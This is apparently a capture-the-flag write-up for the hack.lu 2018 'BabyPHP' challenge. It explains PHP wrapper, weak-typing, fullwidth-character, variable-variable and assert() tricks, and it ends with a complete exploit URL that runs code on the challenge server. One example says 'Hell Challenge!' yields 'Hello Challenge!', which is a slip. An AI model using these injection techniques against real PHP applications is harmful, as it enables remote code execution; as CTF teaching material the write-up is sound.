After access this site, we will see [source code](https://github.com/0ops/ctfs/blob/master/2018/hacklu-2018/web/BabyPHP/index.php) here, we can know this is a typical PHP trick challenge.

## Part One: PHP Wrapper

```php
@$msg = $_GET['msg'];
if(@file_get_contents($msg)!=="Hello Challenge!"){
    die('Wow so rude!!!!1');
}
```

At first, we need to find an input which satisfies the above conditions. In here, we need PHP wrapper.

PHP can read something like ``php://input`` / ``data://text/plain;xxx`` and some other things as file.

For example, ``file_get_contents("data://text/plain,Hell Challenge!")`` will return ``Hello Challenge!`` here, so we can solve this part by use ``data://text/plain,Hell Challenge!`` as payload.

## Part Two: Weak Type

```php
@$k1=$_GET['key1'];
@$k2=$_GET['key2'];

$cc = 1337;$bb = 42;

if(intval($k1) !== $cc || $k1 === $cc){
    die("lol no\n");
}
```

After that, we need to find a k1 which ``intval($k1) == $cc`` and ``$k1 !== $cc``, this is easy, when we post some thing, PHP will use it as string, so ``1337`` is enough here.

## Part Three: UTF8

```php
if(strlen($k2) == $bb){
    if(preg_match('/^\d+＄/', $k2) && !is_numeric($k2)){
        if($k2 == $cc){
            @$cc = $_GET['cc'];
        }
    }
}
```

At first glance, we need to find a k2 which only have digit here, but is not number by PHP's ``is_numeric`` function. But this challenge use ``＄`` rather than ``$``, so ``000000000000000000000000000000000001337＄`` would be cool.

## Part Four: Variable Coverage

```php
if(substr($cc, $bb) === sha1($cc)){
    foreach ($_GET as $lel => $hack){
        $$lel = $hack;
    }
}
```

In PHP, you can use ``$$`` to get a dynamic variable. For example:

```php
$b = true;
$a = 'b';
$$a = false;
var_dump($b); // false here
```

Therefore we can change some variable here. However, we need bypass this check ``substr($cc, $bb) === sha1($cc)`` first. We need another PHP trick here. When we post an array, ``substr`` / ``sha1`` will return ``NULL`` but not throw error here, so send ``cc[]=1`` will bypass this check.

## Part Five: Evil Assert

After satisfying the above conditions, we found that the code to print the flag was commented. But it doesn't matter, we have ``assert`` here! Assert will execute the string passed in, and we can control all variable with variable coverage part.

Finally, our payload is ``https://arcade.fluxfingers.net:1819/?bb=print_r%28%24flag%29%3B%2F%2F&key2=000000000000000000000000000000000001337%EF%BC%84&key1=1337&k1=2&cc%5B%5D=&msg=data%3A%2F%2Ftext%2Fplain%2CHello+Challenge%21``.

